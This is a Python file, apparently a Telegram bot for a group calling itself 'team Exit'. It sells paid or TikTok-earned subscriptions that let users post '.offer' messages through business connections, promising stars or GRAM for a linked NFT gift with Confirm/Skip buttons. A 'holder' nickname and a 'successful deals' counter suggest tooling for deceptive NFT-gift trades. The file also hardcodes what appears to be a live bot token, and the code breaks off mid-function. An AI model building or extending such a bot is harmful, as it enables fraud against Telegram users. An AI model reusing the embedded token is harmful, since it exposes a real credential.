# language: Python 3.11+, file: main.py (Полный объединенный код)
import asyncio
import logging
import os
import re
import sqlite3
import time
import html
import random
import string
from datetime import datetime
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions
)
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# --- НАСТРОЙКИ ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8573521062:AAHqg5EjOvk8NlDQRc7k19aDqVE3KnYnjTw")
MAIN_ADMIN_ID = int(os.getenv("MAIN_ADMIN_ID", "960992616"))
PAYMENT_ME = os.getenv("PAYMENT_ME", "spicegoods")
DEFAULT_HOLDER = "@spicegoods"

LOG_CHAT_ID = int(os.getenv("LOG_CHAT_ID", "-1004358051534"))
LOG_THREAD_ID = int(os.getenv("LOG_THREAD_ID", "1245"))
LOG_THREAD_ID_TEMP = int(os.getenv("LOG_THREAD_ID_TEMP", "1249"))

# --- БАЗА ДАННЫХ ---
DATA_DIR = os.getenv("DATA_DIR", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)

conn = sqlite3.connect(os.path.join(DATA_DIR, "bot_data.db"), check_same_thread=False)
cur = conn.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS channels (channel_id TEXT PRIMARY KEY, channel_link TEXT)")
cur.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
cur.execute("CREATE TABLE IF NOT EXISTS promocodes (code TEXT PRIMARY KEY, uses_left INTEGER, days INTEGER)")
cur.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (MAIN_ADMIN_ID,))
conn.commit()

conn_users = sqlite3.connect(os.path.join(DATA_DIR, "users.db"), check_same_thread=False)
cur_users = conn_users.cursor()
cur_users.execute("""CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru', curr TEXT DEFAULT 'stars', sub_end INTEGER DEFAULT 0,
    holder TEXT DEFAULT '', offers_created INTEGER DEFAULT 0, deals_successful INTEGER DEFAULT 0,
    is_banned INTEGER DEFAULT 0, sub_notified INTEGER DEFAULT 0, offer_style TEXT DEFAULT 'new'
)""")
conn_users.commit()

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
log = logging.getLogger("offer")
OFFER_CMD = re.compile(r"^\.offer\s+(.+)", re.IGNORECASE | re.DOTALL)
_active_offers = {}

# --- ХЕЛПЕРЫ ---
def is_admin(user_id: int) -> bool:
    cur.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
    return cur.fetchone() is not None

def is_banned(user_id: int) -> bool:
    cur_users.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    row = cur_users.fetchone()
    return bool(row and row[0] == 1)

def get_setting(key: str) -> str:
    cur.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cur.fetchone()
    return row[0] if row else ""

def set_setting(key: str, value: str):
    cur.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()

def get_temp_access() -> int:
    val = get_setting('temp_access')
    return int(val) if val else 0

def get_user_settings(user_id: int) -> tuple[str, str, str, int, str]:
    cur_users.execute("SELECT lang, curr, holder, sub_end, offer_style FROM users WHERE user_id = ?", (user_id,))
    row = cur_users.fetchone()
    if not row:
        cur_users.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
        conn_users.commit()
        return 'ru', 'stars', '', 0, 'new'
    return row[0], row[1], row[2] or '', int(row[3]) if row[3] else 0, row[4] or 'new'

def set_user_setting(user_id: int, column: str, value):
    cur_users.execute(f"UPDATE users SET {column} = ? WHERE user_id = ?", (value, user_id))
    conn_users.commit()

# --- ЛОГИ И ПРОВЕРКИ ---
async def log_sub_grant(user_id: int, dur_text: str):
    try:
        chat = await bot.get_chat(user_id)
        username = f"@{chat.username}" if chat.username else f"ID {user_id}"
    except Exception: username = f"ID {user_id}"
    text = f"Пользователь {username} получил подписку\nВремя: {datetime.now().strftime('%d.%m.%Y %H:%M')}\nСрок: {dur_text}\nБот - @exit12_bot"
    try: await bot.send_message(LOG_CHAT_ID, text, message_thread_id=LOG_THREAD_ID)
    except Exception: pass

async def check_single_channel(ch_id: str, ch_link: str, user_id: int):
    try:
        chat_id_val = int(ch_id) if str(ch_id).lstrip('-').isdigit() else ch_id
        member = await bot.get_chat_member(chat_id=chat_id_val, user_id=user_id)
        if member.status not in ["member", "administrator", "creator"]:
            return (ch_id, ch_link)
    except Exception: return (ch_id, ch_link)
    return None

async def check_user_sub(user_id: int) -> tuple[bool, list]:
    if is_admin(user_id): return True, []
    cur.execute("SELECT channel_id, channel_link FROM channels")
    channels = cur.fetchall()
    if not channels: return True, []
    tasks = [check_single_channel(ch_id, ch_link, user_id) for ch_id, ch_link in channels]
    results = await asyncio.gather(*tasks)
    not_subscribed = [res for res in results if res is not None]
    return len(not_subscribed) == 0, not_subscribed

def get_subscribe_keyboard(not_sub_channels: list) -> InlineKeyboardMarkup:
    kb = [[InlineKeyboardButton(text=f"📢 Канал", url=link)] for _, link in not_sub_channels]
    kb.append([InlineKeyboardButton(text="✅ Проверить", callback_data="check_sub")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

# --- FSM ---
class AdminStates(StatesGroup):
    waiting_channel_id = State()
    waiting_channel_link = State()
    waiting_temp_access = State()
    waiting_sub_user = State()
    waiting_remove_sub_user = State()
    waiting_broadcast = State()
    waiting_new_admin = State()
    waiting_user_search = State()
    waiting_promo_code = State()
    waiting_promo_uses = State()
    waiting_promo_days = State()

class SubStates(StatesGroup):
    waiting_tiktok_username = State()
    waiting_tiktok_link = State()

class SettingsStates(StatesGroup):
    waiting_holder = State()

class PromoStates(StatesGroup):
    waiting_promo = State()

# --- ОФФЕР ---
def normalize_nft_url(raw: str) -> str | None:
    s = raw.strip()
    if not s: return None
    if s.startswith("t.me/"): s = "https://" + s
    parsed = urlparse(s)
    if parsed.netloc not in ("t.me", "telegram.me", "www.t.me"): return None
    if "/nft/" not in parsed.path: return None
    return f"https://t.me{parsed.path}".rstrip("/")

def nft_title_from_url(nft_url: str) -> str:
    slug = nft_url.rstrip("/").split("/")[-1]
    if "-" in slug:
        name_part, num = slug.rsplit("-", 1)
        spaced = re.sub(r"([a-z])([A-Z])", r"\1 \2", name_part).replace("_", " ")
        if num.isdigit(): return f"{spaced} #{num}"
    return slug.replace("-", " ").replace("_", " ")

def parse_offer_command(text: str) -> tuple[int, str] | None:
    match = OFFER_CMD.match(text.strip())
    if not match: return None
    rest = match.group(1).strip()
    count_match = re.search(r"(\d+)", rest)
    url_match = re.search(r"(https?://t\.me/nft/[^\s]+|t\.me/nft/[^\s]+|nft/[^\s]+)", rest, re.IGNORECASE)
    if not count_match or not url_match: return None
    return int(count_match.group(1)), normalize_nft_url(url_match.group(1))

def build_offer_text(user_name: str, count: int, nft_url: str, nft_title: str, lang: str, curr: str) -> str:
    safe_name = html.escape(user_name)
    safe_title = html.escape(nft_title)
    curr_symbol = "⭐" if curr == 'stars' else "💎 GRAM"
    if lang == 'en': return (f"💎 <b>{safe_name} offers you {count:,}</b>\n{curr_symbol} <b>for the gift <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n<i>Valid for 24 h.</i>")
    elif lang == 'ar': return (f"💎 <b>{safe_name} يقدم لك {count:,}</b>\n{curr_symbol} <b>مقابل الهدية <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n<i>صالح لمدة 24 ساعة.</i>")
    elif lang == 'zh': return (f"💎 <b>{safe_name} 向您提供 {count:,}</b>\n{curr_symbol} <b>以换取礼物 <a href=\"{nft_url}\">{safe_title}</a>。</b>\n\n<i>有效期为 24 小时。</i>")
    else: return (f"💎 <b>{safe_name} предлагает вам {count:,}</b>\n{curr_symbol} <b>за подарок <a href=\"{nft_url}\">{safe_title}</a>.</b>\n\n<i>Действует 24 ч.</i>")

def build_offer_keyboard(lang: str = 'ru') -> InlineKeyboardMarkup:
    if lang == 'en': d, a = "Skip", "Confirm"
    elif lang == 'ar': d, a = "تخطي", "تأكيد"
    elif lang == 'zh': d, a = "跳过", "确认"
    else: d, a = "Пропустить", "Подтвердить"
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=d, callback_data="decline_offer"), InlineKeyboardButton(text=a, callback_data="accept_offer")]])

async def handle_offer_command(message: types.Message):
    user_id = message.from_user.id
    if is_banned(user_id): return
    lang, curr, holder, sub_end, _ = get_user_settings(user_id)
    if sub_end <= time.time() and get_temp_access() <= time.time() and not is_admin(user_id):
        await message.answer("У вас нет активной подписки. Оформите её в /start.")
        return

    chat_id, conn_id = message.chat.id, message.business_connection_id
    user_name = message.from_user.first_name or "User"

    parsed = parse_offer_command(message.text or "")
    if not parsed:
        try:
            await bot.send_message(chat_id, "Формат: .offer <кол-во> <ссылка>", business_connection_id=conn_id)
            await asyncio.sleep(0.5)
            await message.delete()
        except Exception: pass
        return

    count, nft_url = parsed
    cur_users.execute("UPDATE users SET offers_created = offers_created + 1 WHERE user_id = ?", (user_id,))
    conn_users.commit()

    text = build_offer_text(user_name, count, nft_url, nft_title_from_url(nft_url), lang, curr)
    keyboard = build_offer_keyboard(lang)
    preview = LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True, url=nft_url)

    try:
        sent_msg = await bot.edit_message_text(text=text, chat_id=chat_id, message_id=message.message_id, reply_markup=keyboard, parse_mode="HTML", business_connection_id=conn_id, link_preview_options=preview)
        _active_offers[str(sent_msg.message_id)] = {"nft_url": nft_url, "nft_title": nft_title_from_url(nft_url), "sender_id": user_id, "lang": lang, "count": count, "curr": curr}
    except Exception:
        try: await message.delete()
        except Exception: pass
        try:
            sent_msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=keyboard, parse_mode="HTML", business_connection_id=conn_id, link_preview_options=preview)
            _active_offers[str(sent_msg.message_id)] = {"nft_url": nft_url, "nft_title": nft_title_from_url(nft_url), "sender_id": user_id, "lang": lang, "count": count, "curr": curr}
        except Exception: pass

# --- СТАРТ И МЕНЮ ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if is_banned(user_id):
        await message.answer("🚫 Вы заблокированы.")
        return

    lang, curr, current_holder, sub_end, _ = get_user_settings(user_id)
    if not current_holder and message.from_user.username:
        set_user_setting(user_id, "holder", f"@{message.from_user.username}")

    if sub_end <= time.time() and get_temp_access() <= time.time() and not is_admin(user_id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", callback_data="pay_sub"), InlineKeyboardButton(text="🎁 Бесплатно", callback_data="free_sub")],
            [InlineKeyboardButton(text="🎟 Промокод", callback_data="enter_promo")]
        ])
        await message.answer("У вас нет подписки.\n\nДля использования бота и создания офферов вам необходимо приобрести подписку.", reply_markup=kb)
        return

    is_sub, not_sub = await check_user_sub(user_id)
    if not is_sub:
        await message.answer("Подпишитесь на каналы:", reply_markup=get_subscribe_keyboard(not_sub))
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="menu_profile"), InlineKeyboardButton(text="⚙️ Настройки", callback_data="menu_settings")],
        [InlineKeyboardButton(text="📖 Manual", callback_data="menu_manual"), InlineKeyboardButton(text="💬 Связь", url=f"https://t.me/{PAYMENT_ME}")]
    ])
    await message.answer("Добро пожаловать в бота тимы Exit!\nИспользуйте кнопки ниже.", reply_markup=kb)

@dp.callback_query(F.data == "menu_profile")
async def menu_profile(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    lang, curr, holder, sub_end, _ = get_user_settings(user_id)
    cur_users.execute("SELECT offers_created, deals_successful FROM users WHERE user_id = ?", (user_id,))
    stats = cur_users.fetchone()
    offs, deals = (stats[0], stats[1]) if stats else (0, 0)
    sub_status = "⭐ Навсегда" if sub_end == 9999999999 else (f"⭐ до {datetime.fromtimestamp(sub_end).strftime('%d.%m.%Y')}" if sub_end > time.time() else "❌ Отсутствует")
    text = f"👤 <b>Профиль:</b>\n\n🆔 ID: <code>{user_id}</code>\n💼 Держатель: <b>{holder}</b>\n📅 Подписка: <b>{sub_status}</b>\n\n📊 Офферов: <b>{offs}</b>\n✅ Сделок: <b>{deals}</b>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
    await callback.message.delete()
    await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "menu_settings")
async def menu_settings(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 Язык", callback_data="menu_lang"), InlineKeyboardButton(text="💰 Валюта", callback_data="menu_curr")],
        [InlineKeyboardButton(text="💼 Держатель", callback_data="menu_holder"), InlineKeyboardButton(text="🎨 Вид", callback_data="menu_style")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]
    ])
    await callback.message.delete()
    await callback.message.answer("⚙️ <b>Настройки</b>", reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "menu_lang")
async def menu_lang(callback: types.CallbackQuery):
    lang, _, _, _, _ = get_user_settings(callback.from_user.id)
    marks = {l: ("✅ " if lang == l else "") for l in ['ru', 'en', 'ar', 'zh']}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{marks['ru']}🇷🇺 Русский", callback_data="set_lang_ru"), InlineKeyboardButton(text=f"{marks['en']}🇬🇧 English", callback_data="set_lang_en")],
        [InlineKeyboardButton(text=f"{marks['ar']}🇸🇦 العربية", callback_data="set_lang_ar"), InlineKeyboardButton(text=f"{marks['zh']}🇨🇳 中文", callback_data="set_lang_zh")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_settings")]
    ])
    await callback.message.edit_text("🌐 Выберите язык:", reply_markup=kb)

@dp.callback_query(F.data == "menu_curr")
async def menu_curr(callback: types.CallbackQuery):
    _, curr, _, _, _ = get_user_settings(callback.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{'✅ ' if curr == 'stars' else ''}⭐ Звезды", callback_data="set_curr_stars")],
        [InlineKeyboardButton(text=f"{'✅ ' if curr == 'gram' else ''}💎 GRAM", callback_data="set_curr_gram")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_settings")]
    ])
    await callback.message.edit_text("💰 Выберите валюту:", reply_markup=kb)

@dp.callback_query(F.data == "menu_style")
async def menu_style(callback: types.CallbackQuery):
    *_, style = get_user_settings(callback.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{'✅ ' if style == 'new' else ''}Стандартный", callback_data="set_style_new")],
        [InlineKeyboardButton(text=f"{'✅ ' if style == 'old' else ''}Классический", callback_data="set_style_old")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_settings")]
    ])
    await callback.message.edit_text("🎨 Выберите вид оффера:", reply_markup=kb)

@dp.callback_query(F.data.startswith("set_"))
async def process_setting(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    val = callback.data.replace(f"set_{action}_", "")
    col_map = {"lang": "lang", "curr": "curr", "style": "offer_style"}
    if action in col_map: set_user_setting(callback.from_user.id, col_map[action], val)
    await callback.answer("Сохранено!")
    if action == "lang": await menu_lang(callback)
    elif action == "curr": await menu_curr(callback)
    elif action == "style": await menu_style(callback)

@dp.callback_query(F.data == "menu_holder")
async def menu_holder(callback: types.CallbackQuery, state: FSMContext):
    _, _, holder, sub_end, _ = get_user_settings(callback.from_user.id)
    if sub_end <= time.time():
        await callback.answer("Только с подпиской!", show_alert=True)
        return
    await state.set_state(SettingsStates.waiting_holder)
    await callback.message.edit_text(f"💼 Текущий ник: <code>{holder}</code>\n\nОтправьте новый @ник:", parse_mode="HTML")

@dp.message(SettingsStates.waiting_holder)
async def process_holder(message: types.Message, state: FSMContext):
    new_holder = message.text.strip() if message.text.startswith("@") else "@" + message.text.strip()
    set_user_setting(message.from_user.id, "holder", new_holder)
    await state.clear()
    await message.answer(f"✅ Ник обновлен: <b>{new_holder}</b>", parse_mode="HTML")

@dp.callback_query(F.data == "menu_manual")
async def menu_manual(callback: types.CallbackQuery):
    text = "📖 <b>Как создать оффер:</b>\n\nОтправьте: <code>.offer [кол-во] [ссылка]</code>\nПример: <code>.offer 5000 https://t.me/nft/...</code>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "menu_back")
async def menu_back(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="menu_profile"), InlineKeyboardButton(text="⚙️ Настройки", callback_data="menu_settings")],
        [InlineKeyboardButton(text="📖 Manual", callback_data="menu_manual"), InlineKeyboardButton(text="💬 Связь", url=f"https://t.me/{PAYMENT_ME}")]
    ])
    await callback.message.delete()
    await callback.message.answer("Добро пожаловать в бота тимы Exit!\nИспользуйте кнопки ниже.", reply_markup=kb)

@dp.callback_query(F.data == "check_sub")
async def process_check_sub(callback: types.CallbackQuery):
    is_sub, not_sub = await check_user_sub(callback.from_user.id)
    if is_sub:
        await callback.message.delete()
        await cmd_start(callback.message)
    else: await callback.answer("Вы подписались не на все каналы!", show_alert=True)

# --- ОПЛАТА, ПРОМОКОД, TIKTOK ---
@dp.callback_query(F.data == "pay_sub")
async def pay_sub(callback: types.CallbackQuery):
    pay_text = f"Привет, я хочу купить подписку, мой id {callback.from_user.id}"
    import urllib.parse
    link = f"https://t.me/{PAYMENT_ME}?text={urllib.parse.quote(pay_text)}"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Перейти к оплате", url=link)], [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_start")]])
    text = "💳 <b>Оплата подписки</b>\n\nДень - 120 Р\nНеделя - 250 Р\nМесяц - 350 Р\nНавсегда - 500 Р\n\nНажмите кнопку ниже и прикрепите скриншот оплаты."
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "enter_promo")
async def enter_promo(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(PromoStates.waiting_promo)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_start")]])
    await callback.message.edit_text("🎟 Отправьте ваш промокод в чат:", reply_markup=kb)

@dp.message(PromoStates.waiting_promo)
async def process_promo(message: types.Message, state: FSMContext):
    code = message.text.strip().upper()
    cur.execute("SELECT uses_left, days FROM promocodes WHERE code = ?", (code,))
    row = cur.fetchone()
    if not row or row[0] <= 0:
        await message.answer("❌ Неверный или просроченный промокод.")
        await state.clear()
        return
    cur.execute("UPDATE promocodes SET uses_left = uses_left - 1 WHERE code = ?", (code,))
    _, _, _, sub_end, _ = get_user_settings(message.from_user.id)
    new_end = max(sub_end, int(time.time())) + (row[1] * 86400)
    cur_users.execute("UPDATE users SET sub_end = ?, sub_notified = 0 WHERE user_id = ?", (new_end, message.from_user.id))
    conn.commit(); conn_users.commit()
    await message.answer(f"✅ Промокод активирован! Подписка на {row[1]} дней.")
    await state.clear()
    await cmd_start(message)

@dp.callback_query(F.data == "free_sub")
async def free_sub(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Продолжить", callback_data="tiktok_continue")], [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_start")]])
    text = "🎁 <b>Бесплатная подписка</b>\n\nОпубликуйте видео в TikTok:\n500 👁 - Неделя\n1500 👁 - Месяц\n5000+ 👁 - Навсегда"
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "tiktok_continue")
async def tiktok_continue(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(SubStates.waiting_tiktok_username)
    await callback.message.edit_text("Введите ваш <b>юзернейм в TikTok</b>:", parse_mode="HTML")

@dp.message(SubStates.waiting_tiktok_username)
async def process_tiktok_username(message: types.Message, state: FSMContext):
    await state.update_data(tiktok_user=message.text.strip())
    await state.set_state(SubStates.waiting_tiktok_link)
    await message.answer("Теперь отправьте <b>ссылку на ваше видео</b>:")

@dp.message(SubStates.waiting_tiktok_link)
async def process_tiktok_link(message: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    await message.answer("✅ Заявка отправлена на модерацию.")
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Ок", callback_data=f"appr_{message.from_user.id}"), InlineKeyboardButton(text="❌ Нет", callback_data=f"rej_{message.from_user.id}")]])
    admin_text = f"🎁 <b>Заявка TikTok</b>\nID: <code>{message.from_user.id}</code>\nTikTok: {data.get('tiktok_user')}\nСсылка: {message.text.strip()}"
    try: await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=admin_kb, parse_mode="HTML")
    except Exception: pass

@dp.callback_query(F.data == "back_to_start")
async def back_to_start(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await cmd_start(callback.message)

# --- АДМИНКА ---
def get_admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="⏳ Врем. доступ", callback_data="admin_temp_access"), InlineKeyboardButton(text="❌ Закрыть", callback_data="admin_close_temp")],
        [InlineKeyboardButton(text="🎟 Промокоды", callback_data="admin_promos")],
        [InlineKeyboardButton(text="🔍 Юзеры", callback_data="admin_manage_user")],
        [InlineKeyboardButton(text="➕ Добавить канал", callback_data="admin_add_channel"), InlineKeyboardButton(text="📋 Каналы", callback_data="admin_manage_channels")],
        [InlineKeyboardButton(text="💳 Выдать подписку", callback_data="admin_give_sub"), InlineKeyboardButton(text="❌ Забрать", callback_data="admin_remove_sub")],
        [InlineKeyboardButton(text="👑 Подписчики", callback_data="admin_list_subs")],
        [InlineKeyboardButton(text="✉️ Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="👨‍💻 Админы", callback_data="admin_list_admins")]
    ])

@dp.message(Command("a"))
async def admin_panel(message: types.Message):
    if not is_admin(message.from_user.id): return
    await message.answer("👨‍💻 <b>Админ-панель</b>", reply_markup=get_admin_kb(), parse_mode="HTML")

@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    await callback.message.edit_text("👨‍💻 <b>Админ-панель</b>", reply_markup=get_admin_kb(), parse_mode="HTML")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    cur_users.execute("SELECT COUNT(*) FROM users")
    total_users = cur_users.fetchone()[0]
    cur_users.execute("SELECT COUNT(*) FROM users WHERE sub_end > ?", (int(time.time()),))
    total_subs = cur_users.fetchone()[0]
    temp_access = int(get_setting('temp_access') or 0)
    temp_text = f"до {datetime.fromtimestamp(temp_access).strftime('%d.%m %H:%M')}" if temp_access > time.time() else "Выключен"
    text = f"📊 <b>Статистика:</b>\n\n👥 Пользователей: <b>{total_users}</b>\n⭐ Подписок: <b>{total_subs}</b>\n⏳ Врем. доступ: <b>{temp_text}</b>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "admin_temp_access")
async def admin_temp_access(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    await callback.message.edit_text("Отправьте <b>количество часов</b> доступа:")
    await state.set_state(AdminStates.waiting_temp_access)

@dp.message(AdminStates.waiting_temp_access)
async def process_temp_access(message: types.Message, state: FSMContext):
    if not message.text.isdigit(): return
    hours = int(message.text)
    set_setting('temp_access', str(int(time.time()) + (hours * 3600)))
    set_setting('temp_access_admin', f"@{message.from_user.username}" if message.from_user.username else "Admin")
    set_setting('temp_access_hours', str(hours))
    notify = f"Администратор @{message.from_user.username} открыл доступ на {hours} часов.\nБот - @exit12_bot"
    try:
        msg = await bot.send_message(LOG_CHAT_ID, notify, message_thread_id=LOG_THREAD_ID_TEMP)
        set_setting('temp_access_msg_id', str(msg.message_id))
    except Exception: pass
    await message.answer(f"✅ Доступ открыт на {hours} часов!")
    await state.clear()

@dp.callback_query(F.data == "admin_close_temp")
async def admin_close_temp(callback: types.CallbackQuery):
    set_setting('temp_access', "0")
    msg_id = get_setting('temp_access_msg_id')
    if msg_id and msg_id != "0":
        admin = get_setting('temp_access_admin') or "@spicegoods"
        hours = get_setting('temp_access_hours') or "0"
        new_text = f"Администратор {admin} открыл доступ на {hours} часов.\nБот - <s>@exit12_bot</s>\nДоступ - ❌"
        try: await bot.edit_message_text(chat_id=LOG_CHAT_ID, message_id=int(msg_id), text=new_text, parse_mode="HTML")
        except Exception: pass
        set_setting('temp_access_msg_id', "0")
    await callback.answer("✅ Закрыто!", show_alert=True)

@dp.callback_query(F.data == "admin_promos")
async def admin_promos(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать", callback_data="admin_promo_create")],
        [InlineKeyboardButton(text="📋 Список", callback_data="admin_promo_list")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ])
    await callback.message.edit_text("🎟 <b>Промокоды</b>", reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "admin_promo_create")
async def admin_promo_create(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Отправьте <b>название промокода</b> (например, SALE2024):")
    await state.set_state(AdminStates.waiting_promo_code)

@dp.message(AdminStates.waiting_promo_code)
async def process_promo_code(message: types.Message, state: FSMContext):
    await state.update_data(code=message.text.strip().upper())
    await message.answer("Сколько <b>раз</b> можно использовать?")
    await state.set_state(AdminStates.waiting_promo_uses)

@dp.message(AdminStates.waiting_promo_uses)
async def process_promo_uses(message: types.Message, state: FSMContext):
    if not message.text.isdigit(): return
    await state.update_data(uses=int(message.text))
    await message.answer("Сколько <b>дней подписки</b> дает?")
    await state.set_state(AdminStates.waiting_promo_days)

@dp.message(AdminStates.waiting_promo_days)
async def process_promo_days(message: types.Message, state: FSMContext):
    if not message.text.isdigit(): return
    data = await state.get_data()
    cur.execute("INSERT OR REPLACE INTO promocodes VALUES (?, ?, ?)", (data['code'], data['uses'], int(message.text)))
    conn.commit()
    await message.answer(f"✅ Промокод {data['code']} создан!")
    await state.clear()

@dp.callback_query(F.data == "admin_promo_list")
async def admin_promo_list(callback: types.CallbackQuery):
    cur.execute("SELECT code, uses_left, days FROM promocodes")
    promos = cur.fetchall()
    if not promos: text, kb = "📭 Пусто.", [[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_promos")]]
    else:
        text = "📋 <b>Промокоды:</b>\n\n"
        kb = []
        for code, uses, days in promos:
            text += f"🎟 <code>{code}</code> ({uses} исп., {days} дн.)\n"
            kb.append([InlineKeyboardButton(text=f"❌ Удалить {code}", callback_data=f"admin_promo_del_{code}")])
        kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_promos")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_promo_del_"))
async def admin_promo_del(callback: types.CallbackQuery):
    code = callback.data.replace("admin_promo_del_", "")
    cur.execute("DELETE FROM promocodes WHERE code = ?", (code,))
    conn.commit()
    await callback.answer("Удалено!")
    await admin_promo_list(callback)

@dp.callback_query(F.data == "admin_manage_user")
async def admin_manage_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Отправьте <b>ID</b> или <b>@username</b>:")
    await state.set_state(AdminStates.waiting_user_search)

@dp.message(AdminStates.waiting_user_search)
async def process_user_search(message: types.Message, state: FSMContext):
    val = message.text.strip()
    uid = int(val) if val.isdigit() else None
    if not uid and val.startswith("@"):
        try:
            chat = await bot.get_chat(val)
            uid = chat.id
        except: await message.answer("❌ Не найден."); return
    if not uid: return

    cur_users.execute("SELECT sub_end, is_banned, offers_created, deals_successful, holder FROM users WHERE user_id = ?", (uid,))
    row = cur_users.fetchone()
    if not row: await message.answer("❌ Нет в базе."); return
    sub_end, banned, offs, deals, holder = row
    sub = "Навсегда" if sub_end == 9999999999 else (f"до {datetime.fromtimestamp(sub_end).strftime('%d.%m.%Y')}" if sub_end > time.time() else "Нет")
    text = f"👤 <b>Юзер:</b> <code>{uid}</code>\n💼 Ник: {holder}\n📅 Подписка: <b>{sub}</b>\n🚫 Бан: {'Да' if banned else 'Нет'}\n📈 Офферов: {offs}\n✅ Сделок: {deals}"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Выдать навсегда", callback_data=f"usr_sub_{uid}"), InlineKeyboardButton(text="❌ Забрать", callback_data=f"usr_unsub_{uid}")],
        [InlineKeyboardButton(text="🚫 Бан/Разбан", callback_data=f"usr_ban_{uid}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ])
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data.startswith("usr_"))
async def admin_usr_actions(callback: types.CallbackQuery):
    parts = callback.data.split("_")
